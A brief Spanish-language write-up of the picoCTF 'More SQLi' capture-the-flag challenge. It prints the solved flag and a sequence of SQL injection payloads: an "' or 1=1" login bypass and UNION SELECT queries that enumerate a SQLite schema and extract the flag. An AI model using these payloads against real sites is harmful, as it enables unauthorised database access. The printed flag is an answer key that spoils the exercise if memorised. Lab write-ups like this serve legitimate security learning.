### More SQLi
#### Descripción

¿Puedes encontrar la bandera en esta web?Intenta encontrar [la bandera aquí](http://saturn.picoctf.net:49907/).
## solucion
```
|   |   |
|---|---|
||picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}|
```

## notas
- Pasamos la pantalla de login , poniendo las siguientes cadenas , usuario y password:

`' or 1=1; ' or 1=1;`

- en el campo de búsqueda, usamos, una a una , las siguientes consultas para encontrar la bandera:

`ciudad' union select 1,2,3; ciudad' union select sqlite_version(),2,3; ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,2,flag from more_table;`